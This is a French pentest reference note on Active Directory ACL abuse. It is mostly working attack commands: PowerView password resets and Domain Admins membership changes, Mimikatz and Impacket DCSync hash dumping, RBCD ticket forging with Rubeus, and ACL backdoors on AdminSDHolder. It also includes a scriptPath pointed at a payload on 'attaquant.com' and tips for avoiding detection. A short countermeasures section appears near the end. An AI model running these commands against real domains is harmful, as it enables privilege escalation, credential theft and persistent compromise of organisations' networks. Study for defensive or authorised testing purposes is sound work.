---
title: ACL Abuse
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [acl, active-directory, dacl, escalade-de-privilèges, sécurité, pentest]
date: 2026-03-22
---

# ACL Abuse

Les ACL (Access Control Lists) d'Active Directory définissent qui peut faire quoi sur chaque objet. Des ACL mal configurées permettent à un utilisateur faiblement privilégié de prendre le contrôle d'objets sensibles (comptes admin, groupes, DC).

## Concepts fondamentaux

```
DACL (Discretionary ACL) : liste des permissions d'accès à un objet
SACL (System ACL)         : liste d'audit (qui accède à l'objet)
ACE (Access Control Entry): une règle individuelle dans une DACL

Structure d'un ACE :
  Trustee (qui) : SID de l'utilisateur/groupe
  Type          : Allow / Deny
  Rights        : GenericAll, ReadProperty, WriteProperty...
  Inheritance   : héritage vers les objets enfants
```

## Droits exploitables

### GenericAll — contrôle total

```powershell
# Alice a GenericAll sur l'objet Bob (utilisateur)
# → Peut changer le mot de passe de Bob sans le connaître
net user bob NouveauMotDePasse! /domain

# PowerView
Set-DomainUserPassword -Identity bob -AccountPassword (ConvertTo-SecureString "NouveauMDP!" -AsPlainText -Force)

# GenericAll sur un groupe (ex: Domain Admins)
# → S'ajouter au groupe
Add-DomainGroupMember -Identity "Domain Admins" -Members "alice"

# GenericAll sur un ordinateur
# → Configurer RBCD (Resource-Based Constrained Delegation)
# Voir section AllowedToAct
```

### GenericWrite — écriture sur des attributs

```powershell
# Sur un utilisateur — modifier le scriptPath
# Si le profil script est exécuté à la connexion → persistance/latérale
Set-DomainObject -Identity victim -Set @{scriptpath="\\attaquant.com\share\evil.bat"}

# Sur un utilisateur — ajouter un SPN (Kerberoasting ciblé)
Set-DomainObject -Identity victim -Set @{serviceprincipalname="fake/spn.domaine.local"}
# → Maintenant victim est Kerberoastable → cracker le hash TGS pour obtenir son mot de passe

# Sur un groupe — ajouter des membres (si WriteProperty / GenericWrite sur member)
Add-DomainGroupMember -Identity "Admins IT" -Members "alice"
```

### WriteOwner — changer le propriétaire

```powershell
# Alice a WriteOwner sur l'objet cible
# → Devenir propriétaire → accorde GenericAll implicitement
Set-DomainObjectOwner -Identity cible -OwnerIdentity alice

# Puis s'accorder GenericAll
Add-DomainObjectAcl -TargetIdentity cible -PrincipalIdentity alice -Rights All

# Puis exploiter GenericAll
Set-DomainUserPassword -Identity cible -AccountPassword (ConvertTo-SecureString "Pwnd!" -AsPlainText -Force)
```

### WriteDACL — modifier la DACL

```powershell
# Alice a WriteDACL sur Domain Admins
# → S'accorder n'importe quel droit sur le groupe
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity alice -Rights All

# Puis s'ajouter au groupe
Add-DomainGroupMember -Identity "Domain Admins" -Members alice
```

### ForceChangePassword

```powershell
# Changer le mot de passe sans connaître l'ancien
$password = ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $password

# Avec net (depuis cmd.exe)
net user victim "NewPassword123!" /domain
```

### AllExtendedRights

Inclut plusieurs droits étendus comme `User-Force-Change-Password` et `DS-Replication-Get-Changes-All`.

```powershell
# Si AllExtendedRights sur un utilisateur → ForceChangePassword inclus
# Si AllExtendedRights sur le domaine → DCSync possible !
```

### DCSync — répliquer les hashes du DC

```powershell
# Si un compte a GetChanges + GetChangesAll sur l'objet domaine
# → Peut répliquer les hashes NTLM comme un contrôleur de domaine

# Mimikatz DCSync — récupérer le hash d'un compte spécifique
lsadump::dcsync /user:krbtgt              # Hash du compte KRBTGT
lsadump::dcsync /user:Administrator       # Hash Administrator
lsadump::dcsync /domain:domaine.local /all  # Tous les comptes

# Impacket — sans nécessiter Mimikatz sur la cible
impacket-secretsdump domaine/alice:password@192.168.1.10 -just-dc
impacket-secretsdump -hashes :ntlm_hash domaine/alice@DC01.domaine.local -just-dc
```

### AllowedToAct — RBCD (Resource-Based Constrained Delegation)

Si on peut écrire l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` d'un ordinateur :

```powershell
# 1. Créer un compte machine contrôlé (ou utiliser un existant)
# (Les utilisateurs peuvent créer jusqu'à 10 comptes machines par défaut — MachineAccountQuota)
impacket-addcomputer domaine.local/alice:password -computer-name ATTACKER$ -computer-pass Password123!

# 2. Configurer le RBCD : "ATTACKER$ peut s'impersonifier sur SERVER01"
Set-DomainObject SERVER01$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
    (Get-DomainComputer ATTACKER$ -Properties objectsid).objectsid}

# 3. S'obtenir un ticket de service (TGS) impersonifiant Administrator vers SERVER01
Rubeus.exe s4u /user:ATTACKER$ /rc4:Password123_hash /impersonateuser:Administrator \
    /msdsspn:cifs/SERVER01.domaine.local /ptt

# 4. Accéder à SERVER01 comme Administrator
ls \\SERVER01\c$
```

## Énumération des ACL

```powershell
# PowerView — ACL sur un objet
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}

# ACL accordées à un utilisateur spécifique
Get-DomainObjectAcl -Identity * -ResolveGUIDs |
    Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser alice).objectsid}

# Trouver les chemins d'attaque via ACL (automatisé)
Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object {$_.ObjectAceType -match "GenericAll|WriteDACL|ForceChangePassword"}

# Avec BloodHound (méthode recommandée)
# Les edges GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddMember
# sont visibles automatiquement dans le graphe
```

```bash
# BloodHound.py — collecte et analyse
bloodhound-python -u alice -p password -d domaine.local -c ACL -ns 192.168.1.10
# Puis dans BloodHound :
# Rechercher "alice" → clic droit → "Reachable High Value Targets"
# Ou query Cypher : MATCH (n:User {name:"ALICE@DOMAINE.LOCAL"})-[r]->(m) RETURN n,r,m
```

## Persistance via ACL

```powershell
# Ajouter un backdoor ACL — droit DCSync sur le domaine pour alice
# → Persistance discrète (pas de changement de groupe visible)
Add-DomainObjectAcl -TargetIdentity "DC=domaine,DC=local" \
    -PrincipalIdentity alice \
    -Rights DCSync

# Ajouter WriteOwner sur AdminSDHolder
# → Propagé à tous les objets protégés toutes les heures (SDProp)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domaine,DC=local" \
    -PrincipalIdentity alice \
    -Rights All
```

## Contre-mesures

```
Nettoyage des ACL :
  - Auditer régulièrement avec BloodHound, PingCastle, ou Purple Knight
  - Supprimer les ACL héritées excessives sur les comptes sensibles
  - Utiliser AdminSDHolder pour protéger les comptes privilégiés

Monitoring :
  - Événement 4662 : accès à un attribut d'objet AD (GenericAll, WriteDACL...)
  - Événement 5136 : modification d'un attribut d'objet AD
  - Alerter sur la modification de msDS-AllowedToActOnBehalfOfOtherIdentity

Hardening :
  - Protected Users Security Group (désactive NTLM, délégation, RC4)
  - Tier Model : séparer les comptes admin Tier 0 des autres
  - PAM (Privileged Access Management) pour les comptes sensibles
  - Microsoft LAPS pour les mots de passe des comptes locaux
```

## Pièges courants

- **GenericAll ≠ GenericWrite** : GenericAll inclut tous les droits (modifier ACL, reset password, write properties). GenericWrite permet de modifier les propriétés mais pas l'ACL. Lire précisément ce que BloodHound annonce.
- **WriteDACL est plus fort que WriteOwner** : avec WriteOwner, il faut d'abord changer le propriétaire (action loggée) puis modifier l'ACL. WriteDACL fait l'ACL directement.
- **Targeted Kerberoasting trahi par le SPN** : ajouter un SPN à un user, faire Kerberoast, puis OUBLIER de retirer le SPN = trace évidente d'attaque. Toujours `Set-DomainObject -Clear serviceprincipalname` après.
- **Reset de mot de passe = casse l'utilisateur** : changer le mot de passe d'un compte actif fait perdre l'accès au légitime utilisateur, qui appelle le helpdesk dans l'heure. Bruit max. Préférer Shadow Credentials, qui passe inaperçu.
- **ACL héritées** : un objet hérite des ACL de son OU parent par défaut. Modifier l'ACL d'une OU = effet en cascade sur tous les objets. Très puissant mais très bruyant.
- **AdminSDHolder** : les comptes "protégés" (Domain Admins, etc.) ont leurs ACL réécrites toutes les 60 minutes depuis l'AdminSDHolder. Modifier l'ACL d'un Domain Admin directement = sera annulé. Modifier AdminSDHolder = persistance discrète mais détectable.
- **BloodHound ne reflète que ce qu'il a collecté** : si la collecte SharpHound était partielle (filtre OU, manque session), des chemins existent mais sont invisibles. Toujours `-c All` pour la collecte complète.
- **PowerView vs PowerView_dev** : deux versions co-existent. Les cmdlets diffèrent (`Get-NetUser` vs `Get-DomainUser`). Beaucoup de tutos mélangent. Utiliser PowerView_dev (PowerSploit moderne).
